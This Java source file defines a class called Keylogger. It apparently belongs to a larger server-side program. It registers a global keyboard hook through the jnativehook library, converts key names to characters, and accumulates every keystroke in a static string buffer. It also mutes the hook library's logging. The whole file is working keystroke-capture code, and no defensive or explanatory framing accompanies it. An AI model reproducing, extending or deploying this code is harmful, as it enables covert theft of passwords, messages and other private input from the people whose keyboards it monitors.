package server;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.util.logging.Level;
import java.util.logging.Logger;

public class Keylogger implements NativeKeyListener
{
    public static String str = "";
    public static int count = 0;
    public void stop() throws NativeHookException
    {
        GlobalScreen.unregisterNativeHook();
    }
    private String convert(String key)
    {
        if(key.equals("[Period]"))
        {
            return ".";
        }
        else if(key.equals("[Comma]")) 
        {
            return ",";
        }
        else if(key.equals("[Slash]"))
        {
            return "/";
        }
        else if(key.equals("[Quote]"))
        {
            return "'";
        }
        else if(key.equals("[Semicolon]"))
        {
            return ";";
        }
        else if(key.equals("[Back Slash]"))
        {
            return "\\" ;
        }
        else if(key.equals("[Back Quote]"))
        {
            return "`";
        }
        else if(key.equals("[Minus]"))
        {
            return "-";
        }
        else if(key.equals("[Equals]"))
        {
            return "=";
        }
        else{
            return key;
        }
    }
    public static void run() throws NativeHookException
    {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
            System.exit(-1);
        }
        GlobalScreen.addNativeKeyListener(Server.key);
        
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);
        logger.setUseParentHandlers(false);
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e)
    {
        String key = NativeKeyEvent.getKeyText(e.getKeyCode());
        if (key.length() > 1) key = "[" + key + "]";
        {
            key = convert(key);
            str+= key;
            count = count + key.length();
        }
        if(count >= 500)
        {
            str+= "\n";
            count = 0;
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
    }
}
